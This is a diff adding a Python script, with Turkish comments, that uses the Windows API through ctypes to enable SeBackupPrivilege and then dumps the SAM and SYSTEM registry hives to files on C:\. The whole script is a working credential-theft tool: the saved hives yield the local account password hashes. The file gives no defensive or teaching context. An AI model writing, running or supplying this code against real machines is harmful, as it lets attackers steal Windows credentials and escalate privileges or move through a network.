@@ -1,0 +1,135 @@
+import ctypes
+from ctypes import wintypes
+import os
+
+# Windows API fonksiyonlarını yükleme
+advapi32 = ctypes.WinDLL('Advapi32.dll', use_last_error=True)
+kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)
+
+# Windows API tanımları
+HKEY_LOCAL_MACHINE = 0x80000002
+KEY_READ = 0x20019
+REG_OPTION_BACKUP_RESTORE = 0x00000004
+
+# Token ayrıcalıkları için sabitler
+TOKEN_ADJUST_PRIVILEGES = 0x0020
+TOKEN_QUERY = 0x0008
+SE_PRIVILEGE_ENABLED = 0x00000002
+
+# Yapılar
+class LUID(ctypes.Structure):
+    _fields_ = [
+        ('LowPart', wintypes.DWORD),
+        ('HighPart', wintypes.LONG),
+    ]
+
+class LUID_AND_ATTRIBUTES(ctypes.Structure):
+    _fields_ = [
+        ('Luid', LUID),
+        ('Attributes', wintypes.DWORD),
+    ]
+
+class TOKEN_PRIVILEGES(ctypes.Structure):
+    _fields_ = [
+        ('PrivilegeCount', wintypes.DWORD),
+        ('Privileges', LUID_AND_ATTRIBUTES * 1),
+    ]
+
+# Windows API fonksiyonları
+RegOpenKeyEx = advapi32.RegOpenKeyExW
+RegOpenKeyEx.argtypes = [
+    wintypes.HKEY,
+    wintypes.LPCWSTR,
+    wintypes.DWORD,      # ulOptions (REG_OPTION_BACKUP_RESTORE)
+    wintypes.DWORD,      # samDesired (KEY_READ)
+    ctypes.POINTER(wintypes.HKEY)
+]
+RegOpenKeyEx.restype = wintypes.LONG
+
+RegSaveKey = advapi32.RegSaveKeyW
+RegSaveKey.argtypes = [wintypes.HKEY, wintypes.LPCWSTR, wintypes.LPVOID]
+RegSaveKey.restype = wintypes.LONG
+
+RegCloseKey = advapi32.RegCloseKey
+RegCloseKey.argtypes = [wintypes.HKEY]
+RegCloseKey.restype = wintypes.LONG
+
+OpenProcessToken = advapi32.OpenProcessToken
+OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
+OpenProcessToken.restype = wintypes.BOOL
+
+LookupPrivilegeValue = advapi32.LookupPrivilegeValueW
+LookupPrivilegeValue.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.POINTER(LUID)]
+LookupPrivilegeValue.restype = wintypes.BOOL
+
+AdjustTokenPrivileges = advapi32.AdjustTokenPrivileges
+AdjustTokenPrivileges.argtypes = [
+    wintypes.HANDLE,
+    wintypes.BOOL,
+    ctypes.POINTER(TOKEN_PRIVILEGES),
+    wintypes.DWORD,
+    ctypes.c_void_p,
+    ctypes.c_void_p
+]
+AdjustTokenPrivileges.restype = wintypes.BOOL
+
+GetCurrentProcess = kernel32.GetCurrentProcess
+GetCurrentProcess.restype = wintypes.HANDLE
+
+GetLastError = kernel32.GetLastError
+GetLastError.restype = wintypes.DWORD
+
+def enable_privilege(privilege_name):
+    token_handle = wintypes.HANDLE()
+    process_handle = GetCurrentProcess()
+    # Süreç tokenini aç
+    if not OpenProcessToken(process_handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(token_handle)):
+        print(f"Süreç tokenini açma başarısız oldu. Hata kodu: {GetLastError()}")
+        return False
+    # Ayrıcalığın LUID'sini bul
+    luid = LUID()
+    if not LookupPrivilegeValue(None, privilege_name, ctypes.byref(luid)):
+        print(f"{privilege_name} ayrıcalığının değeri bulunamadı. Hata kodu: {GetLastError()}")
+        return False
+    # Token ayrıcalıklarını ayarla
+    tp = TOKEN_PRIVILEGES()
+    tp.PrivilegeCount = 1
+    tp.Privileges[0].Luid = luid
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+    if not AdjustTokenPrivileges(token_handle, False, ctypes.byref(tp), 0, None, None):
+        print(f"Token ayrıcalıkları ayarlanamadı. Hata kodu: {GetLastError()}")
+        return False
+    # Hataları kontrol et
+    if GetLastError() != 0:
+        print(f"AdjustTokenPrivileges başarısız oldu. Hata kodu: {GetLastError()}")
+        return False
+    return True
+
+def save_registry_key(hive, key_path, file_path):
+    hkey = wintypes.HKEY()
+    
+    # Kayıt defteri anahtarını aç
+    result = RegOpenKeyEx(hive, key_path, REG_OPTION_BACKUP_RESTORE, KEY_READ, ctypes.byref(hkey))
+    
+    if result != 0:
+        print(f"Anahtar açılırken hata: {key_path}. Hata kodu: {result}")
+        return
+    
+    # Anahtarı dosyaya kaydet
+    result = RegSaveKey(hkey, file_path, None)
+    if result == 0:
+        print(f"Kayıt defteri anahtarı {key_path} başarıyla {file_path} konumuna kaydedildi")
+    else:
+        print(f"Kayıt defteri anahtarı {key_path} kaydedilemedi. Hata kodu: {result}")
+    
+    # Anahtarı kapat
+    RegCloseKey(hkey)
+
+if __name__ == "__main__":
+    # SeBackupPrivilege ayrıcalığını etkinleştir
+    if not enable_privilege("SeBackupPrivilege"):
+        print("SeBackupPrivilege ayrıcalığı etkinleştirilemedi")
+    else:
+        # HKEY_LOCAL_MACHINE\SAM ve HKEY_LOCAL_MACHINE\SYSTEM anahtarlarını kaydet
+        save_registry_key(HKEY_LOCAL_MACHINE, "SAM", r"C:\SAM")
+        save_registry_key(HKEY_LOCAL_MACHINE, "SYSTEM", r"C:\SYSTEM")
